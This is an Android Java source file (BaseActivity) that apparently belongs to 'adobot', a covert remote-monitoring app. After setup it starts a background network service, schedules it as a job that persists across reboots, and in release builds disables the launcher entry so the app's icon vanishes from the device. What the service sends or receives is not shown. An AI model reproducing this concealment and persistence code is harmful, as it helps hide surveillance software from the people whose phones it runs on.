package com.android.adobot.activities;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.PersistableBundle;
import android.support.v7.app.AppCompatActivity;

import com.android.adobot.AdobotConstants;
import com.android.adobot.BuildConfig;
import com.android.adobot.NetworkSchedulerService;

import pub.devrel.easypermissions.EasyPermissions;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;

/**
 * Created by adones on 2/26/17.
 */

public class BaseActivity extends AppCompatActivity {

    private static final String TAG = "BaseActivity";

    @Override
    public void onCreate(Bundle savedInstanceState, PersistableBundle persistentState) {
        super.onCreate(savedInstanceState, persistentState);
    }

    protected void hideApp() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, SetupActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    protected void startClient() {
        scheduleJob();
    }

    protected void requestPermissions() {
        Intent i = new Intent(this, PermissionsActivity.class);
        i.addFlags(FLAG_ACTIVITY_NEW_TASK);
        startActivity(i);
    }

    protected boolean hasPermissions() {
        return EasyPermissions.hasPermissions(this, AdobotConstants.PERMISSIONS);
    }

    protected void done() {
        startClient();
        if (!BuildConfig.DEBUG){
            hideApp();
        }
    }

    private void scheduleJob() {

        Intent serviceIntent = new Intent(this, NetworkSchedulerService.class);
        startService(serviceIntent);

        JobInfo myJob = new JobInfo.Builder(0, new ComponentName(this, NetworkSchedulerService.class))
                .setRequiresCharging(false)
                .setMinimumLatency(3000)
                .setOverrideDeadline(2000)
                .setRequiresDeviceIdle(false)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true)
                .build();

        JobScheduler jobScheduler = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
        jobScheduler.schedule(myJob);
    }

}
